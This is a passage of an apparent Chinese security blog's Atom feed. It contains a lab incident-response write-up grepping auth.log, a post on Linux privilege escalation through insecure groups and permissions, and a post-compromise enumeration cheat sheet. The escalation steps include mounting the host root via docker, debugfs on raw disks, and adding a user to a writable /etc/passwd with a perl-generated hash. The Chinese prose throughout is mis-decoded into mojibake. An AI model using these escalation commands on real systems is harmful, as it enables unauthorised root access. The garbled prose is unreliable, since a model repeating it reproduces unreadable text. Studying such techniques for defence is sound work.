class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>æŸ¥æ‰¾ç™»å½•æˆåŠŸç™»é™†çš„ipä¸€å…±çˆ†ç ´äº†å¤šå°‘æ¬¡ï¼Œå°±æŸ¥çœ‹â€Failed password for rootâ€å­—æ®µï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªçš„æŸ¥è¯¢ï¼Œå‰é¢çš„æ•°å­—å°±æ˜¯ç™»é™†æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>åé—¨ç”¨æˆ·å°±æŸ¥â€new userâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥çœ‹&#x2F;etc&#x2F;passwdçš„å†…å®¹</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>åé—¨ç”¨æˆ·æ˜¯test2</p><p><strong>æ¥è¡¥å……ä¸€ä¸‹æ—¥å¿—ç›¸å…³çš„çŸ¥è¯†</strong></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>ä¸Šé¢æŸ¥è¯¢çš„å­—æ®µæ˜¯æ—¥å¿—çš„çº§åˆ«ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user è¡¨ç¤ºå°è¯•ä½¿ç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€‚<br>Failed password è¡¨ç¤ºä¸ºæŸä¸ªç”¨æˆ·è¾“å…¥äº†é”™è¯¯çš„å¯†ç ã€‚<br>authentication failure è¡¨ç¤ºè®¤è¯å¤±è´¥ã€‚<br>Connection closed è¡¨ç¤ºè¿æ¥è¢«å…³é—­ã€‚<br>Accepted password è¡¨ç¤ºå¯†ç è®¤è¯æˆåŠŸã€‚<br>new user æˆ– new group è¡¨ç¤ºåˆ›å»ºäº†æ–°ç”¨æˆ·æˆ–æ–°ç”¨æˆ·ç»„ã€‚<br>password changed è¡¨ç¤ºç”¨æˆ·å¯†ç è¢«æ›´æ”¹ã€‚<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;linuxå…¥ä¾µæ’æŸ¥&quot;&gt;Linuxå…¥ä¾µæ’æŸ¥&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;è¿™æ˜¯é¶æœºçš„ç®€ä»‹&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code clas</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”wp" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linuxææƒ-ä¸å®‰å…¨é…ç½®é¡¹</title>
    <link href="https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
    <id>https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</id>
    <published>2024-07-01T05:26:22.000Z</published>
    <updated>2024-08-05T15:42:00.397Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="ä¸å®‰å…¨çš„ç”¨æˆ·ç»„">ä¸å®‰å…¨çš„ç”¨æˆ·ç»„</span></h1><p><strong>diskç”¨æˆ·ç»„</strong></p><p>diskç”¨æˆ·ç»„æ˜¯Linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ·ç»„ï¼Œç»„å†…æˆå‘˜å¯ä»¥å¯¹ä¸€äº›å—è®¾å¤‡(æ¯”å¦‚ç¡¬ç›˜ã€CDç­‰)è¿›è¡Œè¯»å†™ã€‚å¦‚æœå±äºdiskç”¨æˆ·ç»„ï¼Œå°±å¯ä»¥æ‰“å¼€Linuxçš„å†…ç½®å·¥å…·debugfsçš„äº¤äº’å¼å‘½ä»¤è¡Œï¼Œå¹¶å¯ä»¥æŒ‚è½½åˆ°æ–‡ä»¶ç³»ç»Ÿæ¥è°ƒè¯•æ–‡ä»¶</p><p>å…ˆdfå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç£ç›˜ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>å‡è®¾å½“å‰çš„ç›®å½•åˆ†åŒºä¸º&#x2F;dev&#x2F;sda2ï¼Œç„¶ådebugfsæ‰“å¼€äº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œè°ƒè¯•</p><p><strong>admç”¨æˆ·ç»„</strong></p><p>æ­¤ç»„çš„æˆå‘˜é€šå¸¸æ‹¥æœ‰è¯»å–å’Œå†™å…¥ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ã€æŸ¥çœ‹ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡ä»¥åŠæ‰§è¡Œå…¶ä»–ç³»ç»Ÿç®¡ç†ä»»åŠ¡çš„æƒé™ã€‚å¯ä»¥æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„ç›®å½•ç³»ç»Ÿæ•æ„Ÿæ—¥å¿—</p><p><strong>shadowç”¨æˆ·ç»„</strong></p><p>&#x2F;etc&#x2F;shadowç”¨äºå­˜å‚¨ç”¨æˆ·å¯†ç ï¼Œé™¤äº†rootç”¨æˆ·ï¼Œè¿˜æœ‰shadowç”¨æˆ·ç»„æˆå‘˜ä¹Ÿå¯ä»¥æŸ¥çœ‹è¯¥æ–‡ä»¶ã€‚</p><p><strong>lxdç”¨æˆ·ç»„</strong></p><p>æ”¹ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨Linuxå®¹å™¨(LXD)ã€‚</p><p>Linuxå®¹å™¨æ˜¯ä¸€ç§è½»é‡çº§çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œèƒ½å¤Ÿåœ¨å•ä¸ªLinuxç³»ç»Ÿä¸Šè¿è¡Œå¤šä¸ªç‹¬ç«‹çš„Linuxå®ä¾‹ã€‚</p><p>ç”¨æˆ·æ‰€å±è¯¥ç»„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨lxcå‘½ä»¤åˆ›å»ºæ–°å®¹å™¨ï¼Œç„¶åå°†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½è‡³å®¹å™¨ä¸­ï¼Œå³å¯æŸ¥çœ‹å®¿ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶ç­‰æ“ä½œ</p><p><strong>Dockerç”¨æˆ·ç»„</strong></p><p>Linuxå®‰è£…å®Œdockerä¹‹åä¼šåˆ›å»ºä¸€ä¸ªåä¸ºdockerçš„ç”¨æˆ·ç»„ã€‚å¦‚æœå±äºè¿™ä¸ªç»„æˆ–è€…æ˜¯rootç”¨æˆ·å°±å¯ä»¥ä½¿ç”¨dockerå‘½ä»¤å°è¯•ææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#è¯¥å‘½ä»¤ç”¨äºå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/mntç›®å½•ä¸‹</span><br><span class="hljs-comment"># æ‰§è¡Œè¿™æ¡å‘½ä»¤æ—¶ï¼Œdockeræ£€æŸ¥æ˜¯å¦å­˜åœ¨alpineé•œåƒï¼Œä¸å­˜åœ¨ä¼šä»docker hubä¸­ä¸‹è½½ï¼Œç„¶åä»¥è¯¥é•œåƒä½œä¸ºåŸºç¡€</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨å®¹å™¨ä¸­è®¿é—®å®¿ä¸»æœºçš„ç³»ç»Ÿæ–‡ä»¶äº†</p><h1><span id="ä¸å®‰å…¨çš„è¯»å†™æƒé™">ä¸å®‰å…¨çš„è¯»å†™æƒé™</span></h1><p><strong>å¯å†™çš„&#x2F;etc&#x2F;passwdæ–‡ä»¶</strong></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwdçš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh /etc/passwd<br></code></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨ä»»æ„ç”¨æˆ·å¯ä»¥è¯»å†™çš„æƒ…å†µï¼Œå°±å¯ä»¥ç”Ÿæˆç”¨æˆ·ä¿¡æ¯æ·»åŠ åˆ°è¯¥æ–‡ä»¶ä¸­</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆå¸¦ç›å¯†ç </p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;123456&quot;,&quot;suiyi&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>å¯è¯»çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&quot;&gt;ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;diskç”¨æˆ·ç»„&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;diskç”¨æˆ·ç»„æ˜¯Linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ·ç»„ï¼Œç»„å†…æˆå‘˜å¯ä»¥å¯¹ä¸€äº›å—è®¾å¤‡(æ¯”å¦‚ç¡¬ç›˜ã€CDç­‰)è¿›è¡Œè¯»å†™ã€‚å¦‚æœå±äºdiskç”¨æˆ·ç»„ï¼Œå°±</summary>
      
    
    
    
    <category term="Linuxææƒ" scheme="https://clowsman.github.io/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linuxææƒ" scheme="https://clowsman.github.io/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linuxææƒ-ä¿¡æ¯æœé›†</title>
    <link href="https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2024-06-25T11:30:08.000Z</published>
    <updated>2024-07-15T07:11:59.488Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="æœåŠ¡å™¨ä¿¡æ¯æšä¸¾">æœåŠ¡å™¨ä¿¡æ¯æšä¸¾</span></h1><p><strong>åˆ¤æ–­æ˜¯å¦è™šæ‹ŸåŒ–</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">systemd-detect-virt <span class="hljs-comment">#è¯†åˆ«ç³»ç»Ÿè¿è¡Œç¯å¢ƒï¼Œçœ‹æ˜¯å¦è™šæ‹ŸåŒ–</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511101.png" alt="image-20240625200028837"></p><p><strong>æŸ¥æ‰¾å½“å‰shellæ˜¯å¦å¤„äºdockerä¸­</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#å¯ä»¥çœ‹åˆ°æ“ä½œç³»ç»Ÿåç§°ã€ç‰ˆæœ¬ã€æ¶æ„ã€ä¸»æœºåã€å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ç­‰</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¸»æœºåä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostname<br><span class="hljs-built_in">uname</span> -n<br></code></pre></td></tr></table></figure><h1><span id="ç”¨æˆ·ä¿¡æ¯æšä¸¾">ç”¨æˆ·ä¿¡æ¯æšä¸¾</span></h1><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment">#åŒ…å«ç”¨æˆ·åã€ç”¨æˆ·IDå’Œç”¨æˆ·æ‰€å±ç»„åŠç»„ID</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·ç»„</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹idå’Œå¯¹åº”ç»„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="hljs-keyword">do</span> <span class="hljs-built_in">id</span> <span class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç™»é™†åˆ°ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w <span class="hljs-comment">#å¯ä»¥è¾“å‡ºç”¨æˆ·çš„ç™»å½•åã€æ‰€ä½¿ç”¨çš„ç»ˆç«¯ã€å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤ã€ç™»é™†æ—¶é—´å’Œç³»ç»Ÿè¿è¡Œæ—¶é—´ç­‰ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç™»é™†çš„ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">users</span> <span class="hljs-comment">#ä»…ä¼šåˆ—å‡ºç”¨æˆ·å</span><br></code></pre></td></tr></table></figure><p><strong>å†å²ç™»é™†ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">last<br></code></pre></td></tr></table></figure><p><strong>æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰è¶…ç®¡ç”¨æˆ·</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd 2&gt;/dev/null | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123;print $1&#125;&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1><span id="ç¯å¢ƒé…ç½®æšä¸¾">ç¯å¢ƒé…ç½®æšä¸¾</span></h1><ul><li>ç³»ç»Ÿè·¯å¾„ï¼šPATHç¯å¢ƒå˜é‡å­˜å‚¨äº†ç³»ç»Ÿä¸­å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®</li><li>ç”¨æˆ·ä¿¡æ¯ï¼šHOMEç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„å®¶ç›®å½•è·¯å¾„ï¼ŒUSERç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·å</li><li>å‘½ä»¤è¡Œé€‰é¡¹ï¼šSHELLç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„é»˜è®¤Shellç¨‹åºçš„è·¯å¾„</li><li>å…¶ä»–ä¿¡æ¯ï¼šLANGUAGEç¯å¢ƒå˜é‡å­˜å‚¨äº†ç”¨æˆ·çš„é»˜è®¤è¯­è¨€ç¯å¢ƒ</li></ul><p>ç¯å¢ƒå˜é‡é…ç½®ä¸å½“å¯èƒ½å¯¼è‡´æƒé™æå‡</p><p><strong>æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&#x27;LS_COLORS&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç”¨æˆ·ç¯å¢ƒé…ç½®æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;profileæ˜¯Linuxçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼ŒåŒ…å«äº†ç³»ç»Ÿçº§åˆ«çš„é…ç½®ä¿¡æ¯ï¼›åœ¨å¯åŠ¨æ—¶è¢«è¯»å–ï¼Œå¹¶è®¾ç½®ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€ç”¨æˆ·å˜é‡ã€Shellé€‰é¡¹ç­‰ã€‚profileè¿˜å¯ä»¥åŒ…å«shellè„šæœ¬ç”¨äºæ‰§è¡Œä¸€äº›åˆå§‹åŒ–å’Œé…ç½®å·¥ä½œ</p><p><strong>æŸ¥çœ‹å¯ç”¨Shellè·¯å¾„</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shells<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511102.png" alt="image-20240625202026353"></p><h1><span id="ç½‘ç»œä¿¡æ¯æšä¸¾">ç½‘ç»œä¿¡æ¯æšä¸¾</span></h1><p><strong>æŸ¥çœ‹ç½‘ç»œæ¥å£ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig -a<br>ip addr show<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡æŸ¥çœ‹IPé…ç½®æ–‡ä»¶æ¥æŸ¥çœ‹ç½‘ç»œæ¥å£ä¿¡æ¯</p><ul><li>Ubuntu18ä¹‹å‰æŸ¥çœ‹&#x2F;etc&#x2F;network&#x2F;interfacesæ–‡ä»¶</li><li>Ubuntu18ä¹‹åæŸ¥çœ‹&#x2F;etc&#x2F;netplan&#x2F;*.yaml</li><li>CentOS 8åŠä¹‹å‰æŸ¥çœ‹&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*æ–‡ä»¶</li><li>CentOS Stream 9æŸ¥çœ‹&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;ä¸‹çš„æ–‡ä»¶</li></ul><p><strong>æŸ¥çœ‹ARPç¼“å­˜ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp -a<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹è·¯ç”±ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">route<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹ç½‘ç»œè¿æ¥ä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -antlp 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œè¿æ¥ä¿¡æ¯</span><br>netstat -ntpl 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„TCPç«¯å£</span><br>netstat -nupl 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹æ­£åœ¨ç›‘å¬çš„UDPç«¯å£</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹DNSä¿¡æ¯</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf <span class="hljs-comment">#æŸ¥çœ‹è¯¥DNSé…ç½®æ–‡ä»¶ï¼Œé‡Œé¢ä¿å­˜äº†æœ¬åœ°ç³»ç»Ÿç”¨äºåŸŸåè§£æçš„DNSæœåŠ¡å™¨ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h1><span id="ç³»ç»Ÿè¿›ç¨‹æšä¸¾">ç³»ç»Ÿè¿›ç¨‹æšä¸¾</span></h1><p><strong>æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps aux 2&gt;/dev/null<br>ps aux 2&gt;/dev/null | grep <span class="hljs-string">&#x27;root&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹</span><br>ps aux 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | xargs -r <span class="hljs-built_in">ls</span> -la 2&gt;/dev/null | awk <span class="hljs-string">&#x27;!x[$0]++&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#æŸ¥çœ‹è¿›ç¨‹æ‰€å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶åŠæƒé™ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h1><span id="ç‰¹æƒè®¿é—®æšä¸¾">ç‰¹æƒè®¿é—®æšä¸¾</span></h1><p><strong>æŸ¥çœ‹sudoersæ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers <span class="hljs-comment">#è¯¥é…ç½®æ–‡ä»¶ç”¨äºæˆæƒæŸäº›ç”¨æˆ·ä»¥è¶…çº§æƒé™æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤ï¼Œé»˜è®¤æƒ…å†µè¯¥æ–‡ä»¶åªæœ‰rootèƒ½è¯»å–</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ˜¯å¦å¯ä»¥æ— å¯†ç ä½¿ç”¨sudo</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> | sudo -S -l -k<br></code></pre></td></tr></table></figure><ul><li>-Sè¡¨ç¤ºä»æ ‡å‡†è¾“å…¥è·å–å¯†ç ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ç©ºå¯†ç </li><li>-l è¡¨ç¤ºåˆ—å‡ºå½“å‰ç”¨æˆ·èƒ½ç”¨çš„æƒé™</li><li>-k è¡¨ç¤ºé‡ç½®æ—¶é—´æˆ³ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ¬¡å†æ‰§è¡Œsudoæ—¶ä¾¿éœ€è¦è¾“å…¥å¯†ç </li></ul><h1><span id="cronä»»åŠ¡æšä¸¾">cronä»»åŠ¡æšä¸¾</span></h1><p><strong>æŸ¥çœ‹æ‰€æœ‰cronä»»åŠ¡</strong></p><p>åˆ—å‡º&#x2F;etc&#x2F;ä¸‹æ‰€æœ‰ä»¥cronå¼€å¤´çš„æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /etc/cron* 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€äº›å¯èƒ½çš„æ–‡ä»¶ï¼š</p><ul><li>&#x2F;etc&#x2F;crontabï¼šè¯¥æ–‡ä»¶æ˜¯cronçš„ä¸»é…ç½®æ–‡ä»¶ï¼Œç”¨æ¥ç®¡ç†å…¨å±€å®šæ—¶ä»»åŠ¡ï¼Œå³å¯¹æ•´ä¸ªç³»ç»Ÿæœ‰æ•ˆçš„å®šæ—¶ä»»åŠ¡ï¼ŒåŒ…å«ä»»åŠ¡çš„æ—¶é—´ã€å‘½ä»¤ä»¥åŠæ‰§è¡Œæ­¤ä»»åŠ¡çš„ç”¨æˆ·ã€‚æ­¤é…ç½®ä»»åŠ¡è¿˜åŒ…å«ï¼šSHELLå­—æ®µï¼Œç”¨æ¥æŒ‡å®šè¿è¡Œä»»åŠ¡æ—¶ä½¿ç”¨çš„Shellè·¯å¾„ä¿¡æ¯ï¼›PATHå­—æ®µï¼Œç”¨æ¥æŒ‡å®šè¿è¡Œcronä½œä¸šæ—¶ä½¿ç”¨çš„ç¯å¢ƒå˜é‡è·¯å¾„çš„å€¼ã€‚</li><li>&#x2F;etc&#x2F;cron.dç›®å½•ï¼Œè¯¥ç›®å½•ä¸‹ä¹Ÿä¸€èˆ¬å­˜æ”¾ç³»ç»Ÿçº§åˆ«çš„å®šæ—¶ä»»åŠ¡</li><li>&#x2F;etc&#x2F;cron.dailyã€&#x2F;etc&#x2F;cron.hourlyã€&#x2F;etc&#x2F;cron.monthlyã€&#x2F;etc&#x2F;cron.weeklyç›®å½•ä¸‹åˆ†åˆ«æŒ‡å®šäº†æ¯å¤©ã€æ¯å°æ—¶ã€æ¯ä¸ªæœˆã€æ¯å‘¨è¿è¡Œä¸€æ¬¡çš„è„šæœ¬ã€‚</li></ul><p><strong>æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><p>åˆ—ä¸¾æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡(éœ€è¦rootæƒé™)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd | <span class="hljs-built_in">cut</span> -f1 -d:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;### Crontabs for <span class="hljs-variable">$user</span> ####&quot;</span>; crontab -u <span class="hljs-variable">$user</span> -l; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l -u &lt;ç”¨æˆ·å&gt;<br></code></pre></td></tr></table></figure><h1><span 